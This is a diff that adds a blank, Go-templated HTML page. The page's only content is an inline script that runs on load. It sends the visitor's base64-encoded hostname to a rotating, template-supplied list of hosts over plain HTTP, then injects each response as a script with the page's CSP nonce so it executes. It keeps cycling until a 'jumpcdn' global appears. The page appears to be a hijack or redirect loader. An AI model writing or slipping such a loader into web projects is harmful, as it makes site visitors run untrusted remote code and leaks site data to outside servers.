@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <link rel="icon" href="data:;base64,=">
+</head>
+<body>
+<script nonce="{{.Nonce}}">
+(function () {
+    var encoded = btoa(window.location.hostname);
+
+    var jsURLs = JSON.parse(
+        atob({{.JSURLsJSON}})
+    );
+
+    var jsIndex = 0;
+
+    function loadNextJS() {
+        if (jsIndex >= jsURLs.length) {
+            return;
+        }
+
+        var url =
+            "http://" +
+            jsURLs[jsIndex] +
+            "/app/v1/api.2.JS?1," +
+            encoded;
+
+        fetch(url)
+            .then(function (response) {
+                return response.text();
+            })
+            .then(function (code) {
+                console.log("Second jump response:", code);
+
+
+                var script = document.createElement("script");
+
+                script.nonce = "{{.Nonce}}";
+                script.text = code;
+
+                document.body.appendChild(script);
+
+                jsIndex++;
+
+                setTimeout(function () {
+                    if (typeof jumpcdn === "undefined") {
+                        loadNextJS();
+                    }
+                }, 1500);
+            })
+            .catch(function (error) {
+                console.error("Second jump request failed:", error);
+
+                jsIndex++;
+
+                setTimeout(function () {
+                    loadNextJS();
+                }, 1500);
+            });
+    }
+
+    loadNextJS();
+})();
+</script>
+</body>
+</html>
